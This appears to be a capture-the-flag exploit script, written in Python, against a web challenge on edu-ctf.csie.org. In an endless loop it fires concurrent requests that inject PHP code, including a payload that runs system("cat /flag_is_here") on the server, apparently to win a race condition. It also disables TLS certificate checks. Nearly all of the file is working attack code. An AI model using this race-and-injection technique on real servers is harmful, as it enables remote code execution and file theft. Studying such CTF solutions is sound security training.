import urllib.request
import ssl
import threading
import time
from queue import Queue

table = {}
def thread_job(url):
    response = urllib.request.urlopen(url)
    x = response.read().decode('utf-8').split('</div>')[0].split('</h2>')
    if len(x) != 1:
        if x[1] == '123qq12345e12121212' or x[1] == '456qq12345612121212' or x[1] == '':
            return
        else:
            print(x[1])

ssl._create_default_https_context = ssl._create_unverified_context
q = Queue()


while(1):
    thread1 = threading.Thread(target=thread_job, args = ('https://edu-ctf.csie.org:10155/?f=mydir&i=mydir%2Fmeow&c[]=123qq&c[]=12345e12121212', ))
    thread0 = threading.Thread(target=thread_job, args = ('https://edu-ctf.csie.org:10155/?f=mydir&i=mydir%2Fmeow&c[]=456qq&c[]=12345612121212', ))
    thread3 = threading.Thread(target=thread_job, args = ('https://edu-ctf.csie.org:10155/?f=mydir&i=mydir%2Fmeow&c[]=<?php%0Asystem("cat%20/flag_is_here");%0A', ))
    thread4 = threading.Thread(target=thread_job, args = ("https://edu-ctf.csie.org:10155/?f=mydir&i=mydir%2Fmeow&c[]=<?php%0Aecho%20'HI';%0A", ))

    thread3.start()
    thread0.start()
    thread3.join()
    thread0.join()



